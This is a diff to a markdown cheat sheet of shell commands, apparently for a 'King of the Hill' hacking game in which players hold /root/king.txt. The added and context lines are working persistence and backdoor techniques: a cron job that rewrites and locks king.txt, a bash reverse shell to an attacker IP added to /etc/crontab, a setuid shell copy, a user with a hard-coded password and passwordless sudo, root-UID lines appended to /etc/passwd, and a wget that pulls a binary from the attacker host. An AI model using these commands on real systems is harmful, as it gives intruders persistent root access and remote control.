@@ -278,6 +278,22 @@ sudo mount --bind -o ro /root/king.txt /root/king.txt 2>/dev/null
 
 while true; do (echo -e 'solcoteh' > /root/king.txt); sleep 0.1; done 2>/dev/null &
 
+echo "#!/bin/bash" > /usr/lib/yo.sh
+echo 'echo 'Ap4sh' >| /root/king.txt' >> /usr/lib/yo.sh
+echo "/usr/lib/chattr +i /root/king.txt" >> /usr/lib/yo.sh
+
+chmod +x /usr/lib/yo.sh
+
+(crontab -l 2>/dev/null; echo "* * * * * bash /usr/lib/yo.sh") | sudo crontab -
+```
+
+### BackDoor ✅
+```bash
+
+comando="/bin/bash -c 'bash -i >& /dev/tcp/$ip_address/$port_address 0>&1'"
+echo "* * * * * root $comando" | sudo tee -a /etc/crontab > /dev/null-
+
+
 cp /bin/sh /home/sh && chmod u+s /home/sh
 
 useradd ali && (echo -e 'Mobin@\nMobin@' | passwd ali) && (echo "ali ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers)
@@ -285,8 +301,6 @@ useradd ali && (echo -e 'Mobin@\nMobin@' | passwd ali) && (echo "ali ALL=(ALL:AL
 echo 'mobin:$1$8VO3cUZu$als/bleGjZ3SVjE5EGzvh/:0:0:root:/root:/bin/bash' >> /etc/passwd
 echo 'mobin:$6$/LuWBv7L4QbfG1kf$pb0sFxOLHKiMNiAr2vMdpRc2e8mljxoUlm33fY6KEXLzcH7K51zegdnOYygurWuP/2.KW3eQvcBHXBn9/Jqnj0:0:0:root:/root:/bin/bash' >> /etc/passwd
 password=Mobin@
-
-
 ```
 ### Not_Be-king ✅
 ```bash
@@ -297,6 +311,9 @@ set +o noclobber /root/king.txt
 
 sudo umount -l /root
 sudo umount -l /root/king.txt
+
+wget http://$ip_address:$port_address/chattr
+chmod +x chattr
 ```
 ### mount-trick ✅
 ```bash
